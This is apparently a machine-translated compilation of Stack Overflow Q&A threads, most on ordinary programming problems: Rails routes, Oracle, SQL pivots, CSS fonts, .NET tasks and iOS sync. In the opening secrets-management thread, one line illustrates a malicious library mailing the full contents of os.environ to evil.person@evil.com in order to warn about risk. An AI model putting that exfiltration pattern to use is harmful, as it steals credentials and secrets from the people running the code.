*与您存储机密的方式无关，如果您的系统受到威胁，您就完蛋了。提取这些只是时间和精力的问题。*

那么我们可以做些什么来将风险降到最低呢？

不要以纯文本形式存储/传递秘密。解决该问题的一种方法是使用外部（托管或自托管）机密存储解决方案（例如 AWS Parameter Store、Azure Vault、Hashicorp Vault）并在运行时获取敏感数据（可能缓存在内存中）。这样，您的秘密在传输和静止时都会被加密。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2020-08-13T20:19:56.003

AFAICT，人们建议将机密存储在环境变量中的原因有两个：

1.  无意中将秘密平面文件提交到存储库太容易了。（如果它是一个公共回购，你就完蛋了。）
2.  它可以防止密码混乱，即在许多不同的项目目录文件中使用相同的密钥本身就是一种安全风险，因为开发人员最终会忘记密码的位置。

这两个问题可以通过更好的方式解决。前者应该通过 git commit 钩子来解决，该钩子检查看起来像密码的东西（例如，[gitleaks](https://github.com/zricethezav/gitleaks)）。我希望 Linus 在 git 库的源代码中构建了这样一个工具，但是，唉，这并没有发生。（不用说，秘密文件应该总是添加到`.gitignore`，但你需要一个钩子，以防有人忘记这样做。）

后者可以通过拥有一个全球公司机密文件来解决，该文件理想地存储在只读共享驱动器上。所以，在 Python 中，你可以有类似`from company_secrets import *`.

更重要的是，正如其他人所指出的，破解存储在环境变量中的秘密太容易了。例如，在 Python 中，库作者可以插入`send_email(address="evil.person@evil.com", text=json.dumps(os.environ))`，然后如果您执行此代码，您就大功告成了。如果您的系统上有一个名为`~/secret_company_stuff/.my_very_secret_company_stuff`.

仅限 Django 用户：
如果出现异常（在 DEBUG 模式下），Django（在 DEBUG 模式下）会在浏览器中显示环境变量的原始值。例如，如果开发人员不小心将其`DEBUG=True`投入生产，这似乎非常不安全。相比之下，Django 确实通过在框架文件的变量名中查找字符串、、、、或来混淆密码设置`API`变量。`TOKEN``KEY``SECRET``PASS``SIGNATURE``settings.py`

# ruby-on-rails - Ruby on Rails：路由错误

> ID：12461486
> 
> 赞同：0
> 
> 时间：2012-09-17T14:30:53.657
> 
> 标签：ruby-on-rails, ruby, routing, devise

我无法删除和显示用户记录。

这是我的路线.rb

```
FinalApp::Application.routes.draw do

resources :users
devise_for :users, :controllers => { :registrations => 'admin' }

    resources :projects
    match "search" => "projects#search", :as => :search

    root :to => 'projects#index'
end 
```

这是我的管理控制器：

```
class AdminController < ApplicationController
def index
    @users = User.all

respond_to do |format|
      format.html # index.html.erb
      format.json { render :json => @users }
    end
  end

def create

    @user = User.new(params[:user])

    respond_to do |format|
      if @user.save
        format.html { redirect_to @user, notice: 'User was successfully created.' }
        format.json { render json: @user, status: :created, location: @user }
      else
        format.html { render action: "new" }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
    end
  end

  # GET /users/1
  # GET /users/1.json
  def show
    @user = User.find(params[:id])
@user_user_id = params[:id]

    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @user }
    end
  end

  # GET /users/new
  # GET /users/new.json
  def new
    @user = User.new

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @user }
    end
  end

  # GET /users/1/edit
  def edit
    @user = User.find(params[:id])
  end

  # POST /users
  # POST /users.json

  # PUT /users/1
  # PUT /users/1.json
  def update
    @user = User.find(params[:id])

    respond_to do |format|
      if @user.update_attributes(params[:user])
        format.html { redirect_to @user, notice: 'User was successfully updated.' }
        format.json { head :no_content }
      else
        format.html { render action: "edit" }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /users/1
  # DELETE /users/1.json
  def destroy
    @user = User.find(params[:id])
    @user.destroy

    respond_to do |format|
      format.html { redirect_to users_url }
      format.json { head :no_content }
    end
  end
end 
```

这是我的看法：

```
<%= stylesheet_link_tag "admin" %>
<body>
<div id ="title1">Admin</div>

<div class ="menu"></div>
<div id ="section3">
<table id = "mytable">
<table border = "1">
 <tr>
    <th>Username </th>

    <th>Email</th>
    <th>First Name</th>
        <th>Last Name</th>
<th>Admin?</th>

    <th></th>
    <th></th>
    <th></th>

  </tr>
  <%= link_to "New User", admin_new_path  %><br />

<% @users.each do |t| %>
  <tr>

    <td><%= t.username %></td>

    <td><%= t.email %></td>
    <td><%= t.firstname %></td>

    <td><%= t.lastname %></td>
<td><%= t.admin %></td>

    <td><%= link_to 'Show', t %></td>
    <td> <%= button_to "Delete", t, method: :delete, data: { confirm: 'Are you sure?' } %></td>

  </tr>
<% end %>
</table></br>

</body>

</html> 
```

我可以显示用户数据库，但是当我去删除一条记录时。我得到这个错误`No route matches [DELETE] "/users/11"`。我是 Rails 新手，所以在尝试提供帮助时请记住这一点。提前致谢。

编辑：这是我的路线=>

```
 admin_index GET    /admin(.:format)               admin#index
                         POST   /admin(.:format)               admin#create
               new_admin GET    /admin/new(.:format)           admin#new
              edit_admin GET    /admin/:id/edit(.:format)      admin#edit
                   admin GET    /admin/:id(.:format)           admin#show
                         PUT    /admin/:id(.:format)           admin#update
                         DELETE /admin/:id(.:format)           admin#destroy
        new_user_session GET    /users/sign_in(.:format)       devise/sessions#new
            user_session POST   /users/sign_in(.:format)       devise/sessions#create
    destroy_user_session DELETE /users/sign_out(.:format)      devise/sessions#destroy
           user_password POST   /users/password(.:format)      devise/passwords#create
       new_user_password GET    /users/password/new(.:format)  devise/passwords#new
      edit_user_password GET    /users/password/edit(.:format) devise/passwords#edit
                         PUT    /users/password(.:format)      devise/passwords#update
cancel_user_registration GET    /users/cancel(.:format)        admin#cancel
       user_registration POST   /users(.:format)               admin#create
   new_user_registration GET    /users/sign_up(.:format)       admin#new
  edit_user_registration GET    /users/edit(.:format)          admin#edit
                         PUT    /users(.:format)               admin#update
                         DELETE /users(.:format)               admin#destroy
                projects GET    /projects(.:format)            projects#index
                         POST   /projects(.:format)            projects#create
             new_project GET    /projects/new(.:format)        projects#new
            edit_project GET    /projects/:id/edit(.:format)   projects#edit
                 project GET    /projects/:id(.:format)        projects#show
                         PUT    /projects/:id(.:format)        projects#update
                         DELETE /projects/:id(.:format)        projects#destroy
                  search        /search(.:format)              projects#search
                    root        /                              projects#index 
```

EDIT2：这就是我的 routes.rb 文件的外观。使用 rake 路线，我能够更改路径来解决我的问题。

```
FinalApp::Application.routes.draw do

  # website home
  root :to => 'projects#index'

  # devise sessions (NB does not use admin/users controller)
  devise_for :users, :controllers => { :registrations => 'users' }

  # normal controllers
  resources :users
  resources :projects

  # custom routes
  match "search" => "projects#search", :as => :search

end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:40:14.593

你应该添加`resources :users`到你的`routes.rb`. 在任何情况下，您都可以随时`rake routes`在控制台中查看可用路线。

附带说明一下，您定义`admin`路线的方式并不完全正确。并非一切都是`get`. 例如，创建一个`admin`将是一个`post`. 最简单的方法就是使用类似`resources :admins`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:27:57.963

这似乎是 Devise 的一种非常标准的用法，唯一显着的区别是控制器的名称。因此，设计路由唯一需要的是：

```
devise_for :users, :controllers => { :registrations => 'admin' } 
```

此外，删除所有“get 'admin/*'”条目。在 REST 环境中工作时，并非每个 HTTP 方法都是 GET。[这是一篇讨论 REST 方法的文章。](http://bradley-holt.com/2009/07/html-5-http-methods-rest/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T20:55:31.440

您最终得到了两条通往 admin#destroy 的路线：

```
DELETE /users(.:format)               admin#destroy
DELETE /admin/:id(.:format)           admin#destroy 
```

然而你没有匹配 /users/xx 的路由，只有一个匹配 DELETE /users 的路由，带有可选的格式位。您有一条与 /admin/11 匹配的路线，因此如果您尝试它会起作用，但是我会尝试简化一下。

你真的需要在设计资源上指定一个控制器吗？你到底想在那里覆盖什么，因为你最终得到了大量的路线（如取消），这些路线无处可去，有些路线发生冲突......

尝试一个更简单的路由定义（注意，这需要重命名您的 AdminController UsersController，我会遵循这个约定，因为它会让您的生活更轻松，并匹配您的其他 url，因此您最终会得到 users/1 等，而不是 admin/1）

```
FinalApp::Application.routes.draw do

  # website home
  root :to => 'projects#index'

  # devise sessions (NB does not use admin/users controller)
  devise_for :users

  # normal controllers
  resources :users
  resources :projects

  # custom routes
  match "search" => "projects#search", :as => :search

end 
```

然后执行 rake 路线以确保您了解路线指向的位置。您需要一条路线，上面写着（注意 :id 位）：

```
DELETE /users/:id(.:format)           users#destroy 
```

或者如果您更喜欢管理员控制器（并且愿意整理自定义路由）

```
DELETE /admin/:id(.:format)           admin#destroy 
```

也许在深入研究之前，尽管您可以阅读 rails 路由指南，因为它可能会为您清除一些事情：

[http://guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)

# plugins - 我想在在线 CRM2011 中使用插件来实例化系统工作流程

> ID：12461487
> 
> 赞同：0
> 
> 时间：2012-09-17T14:30:54.860
> 
> 标签：plugins, workflow-activity, dynamics-crm-online

我有一个需要更新自定义实体的工作流程（比如自定义实体），但它将使用插件更新需要传递的记录（即该记录的 GUID）。此插件触发某些事件需要该记录的 GUID，需要将此 GUID 传递给系统工作流。我不知道如何将参数传递给系统工作流。

```
 There Is Some Boundation That Is Why i can not directly trigger that workflow on that event on which PlugIn fires.. 
```

任何形式的帮助将不胜感激。

谢谢， 阿尼什

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:22:49.477

I'll be honest, I only slightly understand your question.

I believe you are asking: "How can I start a workflow programatically? For example in a plugin?".

In which case you do it like this:

```
ExecuteWorkflowRequest request = new ExecuteWorkflowRequest()
{
    WorkflowId = workflowId, //Guid of the workflow you want to start
    EntityId = recordId //Guid of your record
};

ExecuteWorkflowResponse response = (ExecuteWorkflowResponse)serviceProxy.Execute(request); 
```

The workflow must be set to "Run On Demand".

[Full MSDN article.](http://msdn.microsoft.com/en-us/library/gg309600.aspx)

# asp.net - 使用包内的“alter session set current_schema”引用不同的模式

> ID：12461488
> 
> 赞同：1
> 
> 时间：2012-09-17T14:30:56.663
> 
> 标签：asp.net, sql, oracle10g

有没有可能做

```
alter session set current_schema=MySchema; 
```

在包裹内？

我们的 asp.net Web 应用程序调用 Oracle 包。我们想使用不是 MySchema 所有者的 Oracle 用户连接到数据库。为此，我们授予 Other_User 的执行权限以打包 MyPackage。

例子：

```
grant execute on MySchema.MyPackage to Other_User 
```

但是当 web 应用程序连接到 Oracle 并尝试执行 MyPackage 的存储过程时，它会出错，因为表不属于 Other_User。

避免错误的一种方法是创建同义词，但我们更愿意使用

```
alter session set current_schema=MySchema; 
```

如果可能的话，在包装内。

编辑：尝试将“更改会话”放入包中时： ![在此处输入图像描述](../Images/b44e81aab1cee9fcf638d85ea37e7286.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T16:32:19.887

您不能`ALTER SESSION`直接在 PL/SQL 中使用 DDL 语句（即）。

您需要使用`EXECUTE IMMEDIATE`：

```
execute immediate 'alter session set current_schema=MySchema'; 
```

# scala - 在 Scala 中查找适用的隐式转换

> ID：12461496
> 
> 赞同：2
> 
> 时间：2012-09-17T14:31:20.137
> 
> 标签：scala, implicit-conversion

在 Coq 证明助手中 - 它也有隐式转换 - 可以使用命令搜索隐式转换，该`SearchAbout T`命令返回`T`其类型中的所有内容（包括到 或 from 的转换`T`）。

有没有办法为 Scala 程序员找到所有类型的转换？请注意，转换可能在定义源类型或目标类型的项目之外定义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:55:40.293

要快速查看当前范围内是否存在两个引用类型 S 和 T 之间的转换，只需键入

```
((null:S):T) 
```

看看它是否编译。使用 Eclipse Scala IDE >= 2.1M2，如果在首选项中启用了隐式突出显示，您可以查看调用了哪个转换。

当然，这需要您猜测这两种类型（但您可能已经清楚地知道要转换为什么类型），并且它要求转换已经在范围内。

# .net - 可以为 Windows 服务人员使用任务吗

> ID：12461503
> 
> 赞同：3
> 
> 时间：2012-09-17T14:31:40.700
> 
> 标签：.net, service, task-parallel-library

将任务用于 Windows 服务中的工作线程是否是一个很好的设计，还是我们应该更好地坚持使用 Thread.Start()？如果工作人员大部分时间处于空闲状态，甚至可能不会将工作人员启动为 LongRunning，由 FileSystemWatcher 事件触发并使用 Take() 关闭 BlockingCollections 进行处理。

```
Public Class FileWatcherService
Private _watchPaths As New List(Of String) From {"x:\Dir1","x:\Dir2","y:\Dir1", ...}
Private _workers As New List(Of Task)
Private _cancellationTokenSource As New CancellationTokenSource()
Private _cancellationToken As CancellationToken = _cancellationTokenSource.Token

Protected Overrides Sub OnStart(ByVal args() As String)
    For Each path In _watchPaths
        _workers.Add(
            Task.Factory.StartNew(
                Sub()
                    Dim fileProcessor As New FileProcessor
                    fileProcessor.StartWorking(path, _cancellationToken)
                End Sub, TaskCreationOptions.LongRunning, _cancellationToken))
    Next
End Sub

Protected Overrides Sub OnStop()
    _cancellationTokenSource.Cancel()
    Task.WaitAll(_workers.ToArray)
End Sub
End Class

Class FileProcessor
Private _newFiles As New BlockingCollection(Of String)
Sub _fileWatcher_Created(sender As Object, e As FileSystemEventArgs)
    _newFiles.Add(e.FullPath, _cancellationToken)
End Sub

Async Function ProcessNewFiles() As Task
    Do
        Await ProcessFile(_newFiles.Take(_cancellationToken))
    Loop
End Function
End Class 
```

编辑

上面的方法在空闲时不会释放工作线程，因为 Take() 上的块。以下解决方案使用 ActionBlock 而不是 BlockingCollection。此解决方案在空闲监视新文件时不会消耗线程。我启动线程来处理新文件并在完成后释放它们。而且我不再使用 LongRunning 启动顶级工作任务。

```
Class FileProcessor
Private _newFilesActionBlock As New ActionBlock(Of String)(
    Async Function(filePath)
        Await ProcessFile(filePath)
    End Function,
        New ExecutionDataflowBlockOptions With {
            .CancellationToken = _cancellationToken})

Sub _fileWatcher_Created(sender As Object, e As FileSystemEventArgs)
                        Handles __fileWatcher.Created
    _newFilesActionBlock.Post(e.FullPath)
End Sub
'... 
```

结束类

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T19:18:07.243

TPL 是非常受欢迎的 .NET 框架的补充。它使您的线程代码更易于使用且更具可读性。它允许您使您的 Windows 服务（或任何其他线程代码）成为多线程的，而无需实例化和处理线程池和单个线程。

我在我的 Windows 服务中使用 TPL，它对我来说非常有用，我肯定会推荐在大多数情况下使用 TPL 而不是经典线程池。

话虽如此，在一些非常罕见的情况下，您仍然希望自己处理线程池，但根据您的代码片段，您似乎并不需要为此烦恼......

# mysql - 从 MySQL 获取分数 - 比子查询更好的选择？

> ID：12461507
> 
> 赞同：0
> 
> 时间：2012-09-17T14:31:46.473
> 
> 标签：mysql, sql

我正在为一个朋友建立一个网站（一种爱好，而不是任何与职业/工作相关的东西），它将存储有关玩家、游戏和分数的信息。我已经构建了大部分报告/统计信息，但我想显示玩家达到最高分数的次数，并且想知道我是否可以改进我的想法（基于子查询）。我的“分数”表是这样设置的：

分数（id、gameID、playerID、venueID、vsID、score1、score2、score3、score4、score5、total、seasonID）——所有的 xID 都是外键。

前提是每场比赛，每名球员都有一个新条目，所以我有来自文本字段等的 PHP 插入数据。这意味着假设一个赛季有 20 场比赛，并且 score1 'John Smith' 的最高得分达到 10 4 次那个季节。但是他在 score2 上也击中了 8 次，在 score3 上击中了 6 次等等（显然，这些可能在不同的比赛中）。所以在赛季结束时，我有一张大桌子，里面有很多结果（我有 240 行，因为每支球队有 12 名球员），当我查看我的统计数据时，我想知道有多少次约翰史密斯在那个赛季打出 10 分。我显然可以做 5 个查询（或 1 个带有子查询）并添加结果来告诉我这一点，但我想知道纯粹为了我自己的发展。

所以要完成：我希望运行我的查询并得到一个告诉我的结果集：

```
Name       | Total
John Smith | 12
Rob Smith  | 11
Will Smith | 11 
```

等等... | 1

firstName 和 secondName 存储在“player”表中（通过 playerID 外键链接到“scores”表）。如果我愿意，我希望以后能够按需修改查询，例如，如果我想看看有多少次玩家得分为 9 而不是 10（但这显然可以通过通过 PHP 传递数字来完成）。

在这里搜索（+ Google）让我走上了“加入”的道路，但我并没有取得太大的成功。请问有什么帮助吗？:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:12:28.010

我认为这应该可以解决问题：

```
SELECT playerID, COUNT(playerID) AS Total FROM (
SELECT playerID FROM scores WHERE score1='10' 
UNION ALL
SELECT playerID FROM scores WHERE score2='10'
UNION ALL
SELECT playerID FROM scores WHERE score3='10'
UNION ALL
SELECT playerID FROM scores WHERE score4='10'
UNION ALL
SELECT playerID FROM scores WHERE score5='10'
) AS thetable
GROUP BY playerID 
```

其中 10 是您想要的分数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T19:14:33.473

这将获得分别为 10 分的 playerID：

```
select 
    playerID,
    count(score1 = 10 or null) +
    count(score2 = 10 or null) +
    count(score3 = 10 or null) +
    count(score4 = 10 or null) +
    count(score5 = 10 or null)
    as total
from scores
group by playerID
having total > 0 
```

将其加入玩家表以获取名称。

# iphone - iOS 应用程序 - 如何打包资源（笔尖、图像、声音等）以便以后在多个应用程序中重用？

> ID：12461515
> 
> 赞同：1
> 
> 时间：2012-09-17T14:32:08.073
> 
> 标签：iphone, ios, resources, xib, libraries

> **可能重复：**
> [iOS 应用程序共享资产](https://stackoverflow.com/questions/4662344/ios-apps-sharing-assets)

我正在尝试为我的 iOS 应用程序创建一个独特的“关于我”部分，以便以后在其他应用程序中重复使用。

为了最大限度地减少维护我的应用程序的“关于”部分所需的维护工作量，我试图找到创建一个“库”的最佳方法，该库将包含代码以及 xibs/图像/声音这部分我可以简单地在我的所有应用程序中“拖放”。

现在我考虑使用静态库，但它们不允许使用 xib/资源文件 - 所以它似乎不是一个选项。我可以使用“Copy Bundles Resources”从库中手动添加资源，但我将在本节中添加相当多的音效、图像和 xib，因此它似乎不太实用。

有人可以告诉我这样做的首选方式是什么吗？

> **回答**

正如 Vladimir 在下面建议的那样，本教程适用于这种情况： [galloway.me.uk/tutorials/ios-library-with-resources](http://galloway.me.uk/tutorials/ios-library-with-resources)

更新：使用这样的捆绑包，我无法“存档”应用程序以提交到应用程序商店。在使用捆绑包之前需要考虑的事情......但是有一些人成功使用它们的例子。

# sql - 将多行数据合并到一行中

> ID：12461523
> 
> 赞同：2
> 
> 时间：2012-09-17T14:32:41.937
> 
> 标签：sql, sql-server, sql-server-2008-r2, pivot

我正在尝试将表格转换为更易于使用 Excel 操作的视图。我正在 Sql Server 中创建会计部门可以读取的视图，以便在 Excel 中创建统计信息和其他跨表数据透视表。

当前格式的表格

```
职业ID | 产品编号 | 是集团 | 是额外的夜晚 | 价格
-------------+------------+---------+-------------- -----+------
1 | 47 | 0 | 0 | 50
2 | 47 | 0 | 1 | 45
3 | 47 | 1 | 0 | 30
4 | 47 | 1 | 1 | 28

```

我要公开的视图格式

```
产品编号 | 价格 | 附加夜 | 团购价 | 团体额外的夜晚
----------+--------+------------------+------------+ ---------------------
47 | 50 | 45 | 30 | 28

```

如何在 Sql Server 2008 R2 中实现这一点？我需要快速查询，因为它将成为更大查询（使用 CTE）的一部分。

目前，我想的唯一方法是包含 4 个子查询以分别获取所有 4 个价格，但我不喜欢这种方法，它会扫描表 4 次。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:37:04.917

```
SELECT ProductId,
MAX(CASE 
 WHEN IsGroup=0 AND IsAdditionalNight =0 then Price
 END) as [Price],
MAX(CASE 
 WHEN IsGroup=0 AND IsAdditionalNight =1 then Price
 END) as [AdditionalNight],
MAX(CASE 
 WHEN IsGroup=1 AND IsAdditionalNight =0 then Price
 END) as [GroupPrice],
MAX(CASE 
 WHEN IsGroup=1 AND IsAdditionalNight =1 then Price
 END) as [GroupAdditionalNight] 

 FROM table1     
GROUP BY ProductId 
```

或者你也可以使用`PIVOT`（我个人发现语法`PIVOT`比上面的方法更复杂，但没有性能差异，有些人更喜欢`PIVOT`）。

# javascript - 给这个脚本添加一个额外的样式

> ID：12461524
> 
> 赞同：0
> 
> 时间：2012-09-17T14:32:44.253
> 
> 标签：javascript, html

```
<script language="JavaScript">
<!-- Activate cloaking device
document.write('<body background="' + image + '" >')
// Deactivate cloaking device -->
</script> 
```

我需要在背景上添加这种额外的样式。

> 无重复中心中心固定

我试过了，它不起作用：

```
document.write('<body background="' + image + '" no-repeat center center fixed>') 
```

如何将此样式添加到背景中？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:37:15.860

哇，那是一段旧剧本。脚本周围的注释已经很久不需要了，`language`属性被属性替换了`type`。

您必须使用 CSS 样式而不是`background`属性来将这些 CSS 设置添加到样式中：

```
<script type="text/javascript">
document.write('<body style="background: url("' + image + '") no-repeat center center fixed">');
</script> 
```

使用脚本写出正文标签可能会对搜索引擎查看您的页面的方式产生不良影响。像往常一样创建 body 元素并在其上设置样式会更好：

```
<body>
<script type="text/javascript">
document.body.style.background = 'url("' + image + '") no-repeat center center fixed';
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:34:58.063

问题是你没有使用好的语法：

```
document.write('<body style="background:url("' + image + '") no-repeat center center fixed;">'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:36:56.403

```
 document.getElementsByTagName('body').style.background = 'url("' + image + '") no-repeat center center fixed'; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:43:31.323

我建议为此使用 jquery - 采用最新的最小化版本，你应该没问题

只需定义具有背景的类

```
.MyClass
{
    background: url("myPNG.png") no-repeat scroll 8px 37px transparent;
 //some more
} 
```

然后在javascript部分

```
$("#idMyDiv").addClass('MyClass'); 
```

或删除：

```
$("#idMyDiv").addClass('MyClass'); 
```

如果您不想使用 jquery，请尝试以下操作：

```
document.getElementById(id).style.background = "..."; 
```

# linux - Linux内核编程，如何获取信息？

> ID：12461528
> 
> 赞同：0
> 
> 时间：2012-09-17T14:33:05.810
> 
> 标签：linux, linux-kernel

我是 Linux 编程的新手，例如我不知道在哪里可以获取函数信息。我的来源中有一个目录文档。但是例如，我在那里找不到信号量的东西。源代码中的某处是否有所有功能的文档？还是不强制？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:39:17.310

[Linux Kernel Newbies](http://kernelnewbies.org/)站点是一个很好的起点。

当然，内核本身就是最好的参考。开始。也看看[kernel.org/doc](http://kernel.org/doc/)。对于信号量，请在[此处查看此页面](http://www.kernel.org/pub/linux/kernel/people/rusty/kernel-locking/c93.html)。

# javascript - 如何从phonegap android调用本机Listview Activity

> ID：12461529
> 
> 赞同：1
> 
> 时间：2012-09-17T14:33:07.950
> 
> 标签：javascript, android, listview, cordova

我有一个用本机 Java 代码编写的 Listview 活动。我想在 PhoneGap HTML 中调用这个活动。

有没有办法像 html 视图一样显示本机列表视图？

我想这样做是因为本机 Java Listview 比 PhoneGap List View 更快、更高效。

# javascript - Helvetica 在 Windows 操作系统上呈现为 Arial

> ID：12461533
> 
> 赞同：8
> 
> 时间：2012-09-17T14:33:20.727
> 
> 标签：javascript, html, css, windows, macos

在我的网站[http://helvetitee.com](http://helvetitee.com)上，我有以下字体堆栈：

```
font-family: "helvetica neue", helvetica, nimbus-sans; 
```

**Nimbus Sans（一种网络字体）是从 TypeKit 中引入的。**

在 Windows 机器上，无论使用何种浏览器，都会向用户显示 Arial。似乎 Helvetica 被 Windows 渲染为 Arial 而不是回退到 Nimbus（这是 Helvetica 的克隆，因此比 Arial 更可取）。

除了操作系统嗅探之外，还有其他方法可以防止这种情况发生吗？这是一个已知问题吗？对于 Windows 来说，假设可以显示 Arial 而不是 Helvetica 似乎是一种自由。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T16:29:16.960

Windows 用 Arial 代替 Helvetica。（特别是 Helvetica；不是 Helvetica Neue。）查看这一点的一个简单方法是声明`font-family: Helvetica, Courier`. 然后，Windows 平台上的浏览器使用 Arial，而不是 Courier（应该如此）。

这可以通过编辑 Windows 注册表来更改，但作为网络作者，您对此无能为力（除了通过浏览器嗅探尝试操作系统嗅探）。这是一个老问题（我认为至少可以追溯到 Windows 3），虽然不是很广为人知。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:34:37.073

Windows 没有任何这些字体，但足够聪明，可以默认使用它们的 sans-serif 字体，即 arial。

一个网络安全的替代方案就像`font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;`

至于使用网络字体，[fonts.com 有 Helvetica Neue 45 Light](http://webfonts.fonts.com/en-US/Project/ChooseFonts?viewFontId=692680&ViewDetails=T)可以嵌入。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-09T11:41:47.930

是的，Windows 注册表在其默认配置中将 Arial 替换为 Helvetica，并且此替换优先于除 Opera 之外的所有主要浏览器中的字体堆栈回退。所以大多数 Windows 用户会看到 Arial 而不是 Helvetica *，除非*Helvetica 在字体堆栈中前面是

1.  网络字体，或
2.  Windows 系统上可靠存在的替代字体。在我[的类似 Helvetica 的字体堆栈](https://graphicdesign.stackexchange.com/a/9054/9127)中，我建议使用 Google 的“Arimo”网络字体。在标准的 Windows 字体中，Microsoft Sans Serif 可以很好地替代 Helvetica 的直立字体，但不能容忍斜体字体。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:36:13.703

据我所知，Windows 不附带 Hel​​vetica（或其家族的任何成员），如果它不是已安装的字体，它将无法在网站上运行。

Arial 被认为是对 Helvetica 的公然翻版（尽管它基于 Monotype Grotesque，但它被认为是 Helvetica 的替代品），因此微软不必向 Haas Typefoundry（Helvetica 家族的创建者和许可方）支付高额许可费

我的建议是尝试使用 webfonts，您实际上可以使用它嵌入字体。[Font Squirrel](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CCEQFjAA&url=http://www.fontsquirrel.com/&ei=QDVXUOzxKcn80QXf_4DQCg&usg=AFQjCNFrx5G5rbdMVFCgv9uqzvsKiuMH-Q)是一个很好的起点。（但请记住，未经许可嵌入 Helvetica Neue 在技术上是一种违规行为……）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T14:42:25.700

我认为跨浏览器和设备的最佳字体堆栈

```
body {
  font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
  font-weight: 300;
} 
```

另外，使用

```
body {
  font-family: sans-serif
} 
```

在您的字体堆栈覆盖浏览器默认值之前。

# oracle - ORA-00918: 列定义不明确: 如何查找列

> ID：12461534
> 
> 赞同：6
> 
> 时间：2012-09-17T14:33:20.243
> 
> 标签：oracle, ora-00918

我收到了经典错误：

> ORA-00918: 列定义不明确

通常，我知道如何解决它，但我现在的问题是我正在处理 700 行查询。

有没有办法识别列？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-18T09:48:54.960

您是否尝试过二进制搜索？

例如

如果您的原始查询看起来像

```
Select  col1 
       ,col2
       ,col3
       ,col4
from MyTable 
```

1.  你可以先评论下半场

```
Select  col1
       ,col2
       /*,col3
       ,col4 */
from MyTable 
```

2.  如果您仍然收到错误，请再次运行查询并评论另一半的某些列：

```
Select col1
       /*,col2 */
      ,col3
      ,col4
from MyTable 
```

如果你仍然得到一个错误那么你的问题是与`col1`，否则你需要改变`col2`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-17T15:26:58.057

不明确的列错误消息表明您在查询中加入了两个（或更多）列，它们共享相同的列名。

解决这个问题的正确方法是给查询中的每个表一个别名，然后在所有列引用前加上适当的别名。我同意这么大的查询不会很有趣，但我担心你将不得不为你的前任的松懈付出代价。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-09-10T19:14:44.250

在 Oracle 中，您可以使用[all_tab_cols](http://docs.oracle.com/cd/B14117_01/server.101/b10755/statviews_1179.htm)来查询表的列名。以下查询将返回*TABLE1*和*TABLE2*之间的公共列名。然后，您只需要为这些公共列添加前缀，而不是所有 100 个列引用。

```
select column_name from all_tab_cols
where table_name='TABLE1' and owner ='OWNER1' 
and column_name in (
select column_name from all_tab_cols
where table_name='TABLE2' and owner ='OWNER2') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-05T22:16:19.387

为了后代的缘故：当我在查询中选择列 TABLE1.DES 和 TABLE2.DES 时遇到了这个问题，而没有给结果加上别名。当我单独运行它时，我的 SQL 编辑器将它们变成了 DES 和 DES_1，没有任何抱怨。

但是，当我将相同的查询变成子查询时

```
SELECT a.col1, a.col2, a.col3, b.*
from TABLE3 a
INNER JOIN (
--that query as a subquery
) b
on a.PK=b.FK` 
```

它抛出了您描述的相同的 ORA-00918 错误消息。将我的子查询中的 SELECT 更改为

`SELECT TABLE1.DES AS T1_DES, TABLE2.DES AS T2_DES ...`

解决了这个问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-08-03T15:42:32.023

您可以使用以下方法检查常用列：

```
 select COLUMN_NAME from ALL_TAB_COLS where TABLE_NAME = 'tablenamefirst'
intersect
select COLUMN_NAME from ALL_TAB_COLS where TABLE_NAME = 'tablenamesecond'; 
```

# objective-c - 同步后如何正确处理 UI 刷新

> ID：12461535
> 
> 赞同：1
> 
> 时间：2012-09-17T14:33:28.773
> 
> 标签：objective-c, ios, cocoa-touch, grand-central-dispatch

我有一个应用程序，它在每次启动时使用 Rails 后端与服务器同步数据。API 完全可以工作，但是当需要刷新界面时，我遇到了界面变得无响应的问题。

我目前正在使用 GCD 开始同步：

```
Sync *sync = [[Sync alloc] init];
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    [sync force_sync:@""];
    [appModel updateSyncTime:current_time];
}); 
```

同步完成后，我让 Sync 对象向应用程序发送 NSNotification 以便界面刷新：

```
dispatch_async(dispatch_get_main_queue(), ^{
    [[NSNotificationCenter defaultCenter] postNotificationName:@"Sync-Completed" object:self];
}); 
```

